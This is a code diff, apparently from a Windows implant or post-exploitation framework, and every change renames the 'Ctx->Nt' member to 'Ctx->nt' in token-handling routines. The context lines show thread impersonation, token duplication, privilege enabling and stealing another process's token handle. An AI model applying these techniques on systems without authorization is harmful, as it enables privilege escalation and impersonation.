@@ -5,7 +5,7 @@ namespace Token {
 		HEXANE
 
 		HANDLE token = { };
-		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
+		if (NT_SUCCESS(ntstatus = Ctx->nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
 			return TRUE;
 		}
 
@@ -50,7 +50,7 @@ namespace Token {
 		InitializeObjectAttributes(&attrs, nullptr, 0, nullptr, nullptr);
 		attrs.SecurityQualityOfService = &sqos;
 
-		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
+		ntstatus = Ctx->nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
 	}
 
 	VOID SetTokenPrivilege(const wchar_t* privilege, bool enable) {
@@ -72,7 +72,7 @@ namespace Token {
 		: token_priv.Privileges[0].Attributes = NULL;
 
 		if (
-			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
+			!NT_SUCCESS(Ctx->nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
 			!Ctx->win32.AdjustTokenPrivileges(token, FALSE, &token_priv, 0, nullptr, nullptr)) {
 			return_defer(ERROR_INVALID_TOKEN);
 		}
@@ -91,18 +91,18 @@ namespace Token {
 		}
 
 		if (target) {
-			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, target, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
+			if (!NT_SUCCESS(ntstatus = Ctx->nt.NtDuplicateObject(hProcess, target, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
 				return_defer(ntstatus);
 			}
 		} else {
-			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
+			if (!NT_SUCCESS(ntstatus = Ctx->nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
 				return_defer(ntstatus);
 			}
 		}
 
 		defer:
 		if (hProcess) {
-			Ctx->Nt.NtClose(hProcess);
+			Ctx->nt.NtClose(hProcess);
 		}
 
 		return hDuplicate;
@@ -190,7 +190,7 @@ namespace Token {
 				}
 
 				if (entry->handle) {
-					Ctx->Nt.NtClose(entry->handle);
+					Ctx->nt.NtClose(entry->handle);
 					entry->handle = nullptr;
 				}
 
